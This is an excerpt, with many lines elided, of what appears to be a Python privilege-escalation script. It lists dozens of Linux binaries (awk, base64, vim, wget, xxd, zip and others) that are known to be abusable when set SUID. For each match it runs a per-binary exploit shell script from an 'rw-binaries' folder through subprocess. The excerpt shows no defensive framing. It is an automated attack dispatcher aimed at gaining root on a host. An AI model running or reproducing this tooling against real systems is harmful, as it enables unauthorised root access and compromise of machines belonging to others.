...
rwud_vuln = ['x86_64-linux-gnu-ar','arp','atobm','awk','gawk','base32','base64','basenc','busybox','bridge','cat',
        ...
        'update-alternatives','uudecode','uuencode','vim','vimdiff','vim.gtk3','rview','vpiw','vigr','wget',
        'wc','xmodmap','xmore','xxd','xz','yelp','zip','zsoelim']
...
def exploit(binary):
    ...
    # If binary is lower than it's current version uncomment this line.
    #elif 'vim.' in binary:
...
def rw_exploit(binary):
    ...
    #    subprocess.call('bash rw-binaries/suid_docker.sh',shell=True)
        ...
        subprocess.call('bash rw-binaries/suid_wc.sh',shell=True)
    elif 'xmodmap' in binary:
        subprocess.call('bash rw-binaries/suid_xmodmap.sh',shell=True)
    elif 'xmore' in binary:
        subprocess.call('bash rw-binaries/suid_xmore.sh',shell=True)
    elif 'xxd' in binary:
        subprocess.call('bash rw-binaries/suid_xxd.sh',shell=True)
    elif 'xz' in binary:
        subprocess.call('bash rw-binaries/suid_xz.sh',shell=True)
    elif 'yelp' in binary:
        subprocess.call('bash rw-binaries/suid_yelp.sh',shell=True)
    elif 'zip' in binary:
        subprocess.call('bash rw-binaries/suid_zip.sh',shell=True)
